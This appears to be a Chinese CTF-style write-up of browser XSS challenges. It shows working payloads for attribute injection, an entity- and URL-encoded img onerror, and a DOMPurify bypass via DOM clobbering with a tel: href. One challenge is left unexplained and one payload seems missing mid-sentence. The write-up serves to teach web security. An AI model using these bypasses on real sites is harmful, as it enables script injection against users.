Ugandan Knuckles

<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>

这里使用正则把参数内的方括号和尖括号都过滤了。可以注入属性，使用"onfocus=alert(1337) autofocus="，定义onfocus的行为然后使用autofocus获取焦点。

这样语句就变成了<input type="text" placeholder=""onfocus=alert(1337) autofocus="" class="form-control">

<!-- Challenge -->
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">

    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')

Ah That’s Hawt

<!-- Challenge -->
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>

过滤了方括号、括号、斜杠和==`==

但是没有过滤尖括号。输入一个a标签，发现成功被渲染了。但是想要直接使用alert(1337)是不行的，需要经过实体编码。如<img src onerror="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">

但是这样是不够的，因为其中的&#等字符会在url中冲突，需要进行进一步URL编码。最终变成

%3Cimg%20src%20onerror%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E

Ok, Boomer

<!-- Challenge -->
<h2 id="boomer">Ok, Boomer.</h2>
<script>
    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || "Ok, Boomer")
    setTimeout(ok, 2000)
</script>

这段代码用``DOMPurify.sanitize() 把输入的参数boomer过滤得干干净净。但是注意到下一行setTimeout中有个ok并没有被定义，那么可以把ok传进去吗？答案是可以的。在上一行里我们对DOM做了插入操作，在这里就可以使用`

代码执行到setTimeout时，会尝试调用提供的函数ok作为参数时，会意识到它不是一个函数，于是接着调用toString()方法，返回href的属性。

  • href cannot be any arbitrary string, it has to follow protocol:host format, if the string doesn’t follow the format, it’s value will be BaseURL/yourString.
  • tel:alert(1337) is also a valid Javascript, because it follows label:code syntax.
  • tel is used because it’s whitelisted as one of the safe protocols to be allowed by DOMPurify.
